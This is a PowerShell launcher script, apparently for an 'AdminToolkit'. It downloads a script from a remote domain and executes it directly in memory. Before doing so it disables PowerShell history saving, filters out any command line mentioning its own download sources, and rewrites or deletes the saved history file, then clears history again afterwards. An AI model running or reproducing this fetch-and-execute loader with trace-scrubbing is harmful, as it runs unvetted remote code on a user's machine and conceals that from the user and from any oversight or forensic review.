& {
    $ErrorActionPreference = 'Stop'
    $ProgressPreference = 'SilentlyContinue'

    $historyPath = $null
    $historyLines = @()
    $filteredHistory = @()
    $cacheToken = $null
    $launcherUrl = $null
    $launcherCode = $null
    $launcherText = $null
    $launcherScriptBlock = $null
    $bomMarkers = $null

    try {
        try {
            if (Get-Module -Name PSReadLine -ErrorAction SilentlyContinue) {
                try {
                    $historyPath = (Get-PSReadLineOption).HistorySavePath
                }
                catch {
                }

                try {
                    Set-PSReadLineOption `
                        -HistorySaveStyle SaveNothing `
                        -ErrorAction SilentlyContinue
                }
                catch {
                }

                try {
                    Set-PSReadLineOption `
                        -AddToHistoryHandler {
                            param([string]$Line)

                            if ($Line -match '(?i)admintoolkit\.itraccoonverse\.space' -or
                                $Line -match '(?i)raw\.githubusercontent\.com[/\\]LomakaKatya[/\\]AdminToolkit') {
                                return $false
                            }

                            return $true
                        } `
                        -ErrorAction SilentlyContinue
                }
                catch {
                }

                try {
                    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
                }
                catch {
                }
            }

            try {
                Clear-History -ErrorAction SilentlyContinue
            }
            catch {
            }

            if ($historyPath -and
                (Test-Path -LiteralPath $historyPath -PathType Leaf)) {

                $historyLines = @(
                    Get-Content `
                        -LiteralPath $historyPath `
                        -ErrorAction SilentlyContinue
                )

                $filteredHistory = @(
                    $historyLines |
                    Where-Object {
                        $_ -notmatch '(?i)admintoolkit\.itraccoonverse\.space' -and
                        $_ -notmatch '(?i)raw\.githubusercontent\.com[/\\]LomakaKatya[/\\]AdminToolkit'
                    }
                )

                if ($filteredHistory.Count -eq 0) {
                    Remove-Item `
                        -LiteralPath $historyPath `
                        -Force `
                        -ErrorAction SilentlyContinue
                }
                else {
                    $utf8WithoutBom = New-Object `
                        -TypeName System.Text.UTF8Encoding `
                        -ArgumentList $false

                    [System.IO.File]::WriteAllLines(
                        $historyPath,
                        [string[]]$filteredHistory,
                        $utf8WithoutBom
                    )
                }
            }
        }
        catch {
        }

        try {
            [Net.ServicePointManager]::SecurityProtocol =
                [Net.ServicePointManager]::SecurityProtocol -bor
                [Net.SecurityProtocolType]::Tls12
        }
        catch {
            try {
                [Net.ServicePointManager]::SecurityProtocol =
                    [Net.ServicePointManager]::SecurityProtocol -bor 3072
            }
            catch {
            }
        }

        $launcherUrl =
            'https://admintoolkit.itraccoonverse.space/Start-AdminToolkit.ps1'

        $launcherCode = Invoke-RestMethod `
            -Uri $launcherUrl `
            -ErrorAction Stop

        if ([string]::IsNullOrWhiteSpace([string]$launcherCode)) {
            throw 'Службове джерело повернуло порожній завантажувач.'
        }

        $bomMarkers = [char[]]@(
            [char]0xFEFF,
            [char]0x00EF,
            [char]0x00BB,
            [char]0x00BF
        )

        $launcherText = ([string]$launcherCode).TrimStart($bomMarkers)
        $launcherScriptBlock = [ScriptBlock]::Create($launcherText)

        & $launcherScriptBlock
    }
    finally {
        $launcherScriptBlock = $null
        $launcherText = $null
        $launcherCode = $null
        $launcherUrl = $null
        $cacheToken = $null
        $bomMarkers = $null
        $historyLines = $null
        $filteredHistory = $null

        try {
            Clear-History -ErrorAction SilentlyContinue
        }
        catch {
        }

        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
    }
}
